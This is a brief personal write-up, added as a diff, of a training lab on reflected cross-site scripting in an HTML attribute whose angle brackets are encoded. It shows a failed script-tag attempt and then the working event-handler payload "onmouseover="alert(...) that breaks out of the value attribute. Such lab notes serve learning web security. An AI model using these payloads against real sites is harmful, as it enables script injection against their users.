@@ -1,0 +1,17 @@
+LAB INFO: Reflected XSS into attribute with angle brackets HTML-encoded
+
+ANALYSIS:   
+1. There was a search field hai and I try to search for the string: 123456
+   1.1 <input type="text" placeholder="Search the blog..." name="search" value="123456"> ==> And it's shown like this
+2. Now, I want to inject my malicious xss code into the value property value.
+    2.1 value=""><script>alert(1)</scrip>"
+    2.2 <input type="text" placeholder="Search the blog..." name="search" value="" &gt;&lt;script&gt;alert(1)&lt;="" scrip&gt;"="">
+    2.3 It shows like this i.e <=&lt; seems like it's encoding <>characters
+
+3. Now we can use soemthing like:
+  3.1 onmouseover=alert(1) ==> this kind of thing to trigger the xss 
+  3.2 <input type="text" placeholder="Search the blog..." name="search" value=""onmouseover="alert('hacked by rakshak07')">
+  3.3 So our payload is:   "onmouseover="alert('hacked by rakshak07') ==> Notice the single quote ahead of alert balance the quotation so we need it.
+
+
+  HENCE THE LAB IS SOLVED.
